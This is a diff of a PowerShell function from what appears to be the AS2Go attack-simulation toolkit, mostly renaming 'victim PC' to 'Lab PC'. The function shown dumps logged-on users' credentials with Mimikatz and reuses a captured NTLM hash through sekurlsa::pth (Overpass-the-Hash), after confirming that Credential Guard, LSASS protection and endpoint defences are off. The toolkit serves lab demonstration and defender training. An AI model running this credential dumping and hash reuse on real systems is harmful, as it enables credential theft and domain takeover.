@@ -1,10 +1,10 @@
 <#
 .SYNOPSIS
-Runs the AS2Go Overpass-the-Hash (OpTH) attack by reusing a captured NTLM hash on the victim PC.
+Runs the AS2Go Overpass-the-Hash (OpTH) attack by reusing a captured NTLM hash on the Lab PC.
 
 .DESCRIPTION
-Enumerates local administrators and the configured Help Desk group on the victim PC to identify privileged accounts.
-Dumps credentials of recently logged-on users on the victim PC with Mimikatz into a session log file.
+Enumerates local administrators and the configured Help Desk group on the Lab PC to identify privileged accounts.
+Dumps credentials of recently logged-on users on the Lab PC with Mimikatz into a session log file.
 Confirms the compromised Help Desk user and the captured NTLM hash, and offers corrections before execution.
 Launches Mimikatz sekurlsa::pth in a new command window and shows the command required in that window.
 
@@ -21,7 +21,7 @@ Console messages and output from invoked commands; no dedicated result object is
 .NOTES
 Private AS2Go function. Run from an initialized AS2Go module session.
 Requires the configured Help Desk user, the stored NTLM hash, and Mimikatz in the module tools folder.
-Intended to run on the victim PC where credentials of recently logged-on users can be dumped.
+Intended to run on the Lab PC where credentials of recently logged-on users can be dumped.
 
 Tested with Get-FileHash -Path $mimikatzPath -Algorithm SHA256 to verify the integrity of the Mimikatz binary.
 61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1
@@ -31,7 +31,7 @@ mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 Category: Main Function
 
 .FUNCTIONALITY
-Lists local administrators and the configured Help Desk group to find a privileged account on the victim PC.
+Lists local administrators and the configured Help Desk group to find a privileged account on the Lab PC.
 Dumps recently logged-on credentials with Mimikatz and confirms the compromised user and NTLM hash.
 Launches Mimikatz sekurlsa::pth so the stolen hash yields a Kerberos ticket in a new command window.
 #>
@@ -45,7 +45,7 @@ function Invoke-OverPassTheHashAttack {
 
     If (-not $SkipClearHost) { Clear-Host }
 
-    Write-AS2GoOutput -Type Header -Message "Starting Overpass-the-Hash (OpTH) Attack on VictimPC"
+    Write-AS2GoOutput -Type Header -Message "Starting Overpass-the-Hash (OpTH) Attack on Lab PC"
     Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
 
@@ -63,17 +63,17 @@ function Invoke-OverPassTheHashAttack {
         $message = @"
 Please confirm that the following prerequisites are met in the isolated test environment:
   • Run as Administrator
-  • Credential Guard is not running on the victim PC.
+  • Credential Guard is not running on the Lab PC.
   • LSASS is not running as a protected process (PPL).
   • The credential-extraction tool will run with elevated administrator privileges.
   • Endpoint protection is not expected to interfere with the demonstration.
-  • A privileged domain test account has logged on to the victim PC.
+  • A privileged domain test account has logged on to the Lab PC.
   • The test account's NT hash is available or will be obtained during the demonstration.
   • The domain controller is reachable and accepts RC4-HMAC for the test account.
 "@
 
-        $title = "Is the Victim PC ready for the Overpass-the-Hash (OpTH) attack?"
-        #$message = "Please confirm that the following prerequisites are met in the test enviroment:`n  • Credential Guard / VBS is not running..`n  • Endpoint protection is disabled.`n  • Privileged Account logged on the Victim PC."
+        $title = "Is the Lab PC ready for the Overpass-the-Hash (OpTH) attack?"
+        #$message = "Please confirm that the following prerequisites are met in the test enviroment:`n  • Credential Guard / VBS is not running..`n  • Endpoint protection is disabled.`n  • Privileged Account logged on the Lab PC."
 
         $Options = @(
             [pscustomobject] @{
@@ -84,7 +84,7 @@ Please confirm that the following prerequisites are met in the isolated test env
 
             [pscustomobject] @{
                 Label = "&No"
-                Help  = "The Victim PC is not ready. Skip the PtH simulation."
+                Help  = "The Lab PC is not ready. Skip the PtH simulation."
                 Value = $Script:No
             }
         )
@@ -197,7 +197,7 @@ Please confirm that the following prerequisites are met in the isolated test env
     
 
         $name = get-date -Format 'yyyyMMddhhmmss'
-        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.ppt"
+        $CredentialDump = "$($Script:DefautExfiltrationFolder)\$name.pth"
 
         Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe"  `
                 "log $CredentialDump" `
@@ -209,7 +209,7 @@ Please confirm that the following prerequisites are met in the isolated test env
     
         If ($uniqueResults.Count -eq 0) {
             Write-AS2GoOutput -Type Error -Message "No Security Credentials found in Credential Dump."
-            if(-not $unattended) {pause}
+            if (-not $unattended) { pause }
             return
         }
         else {
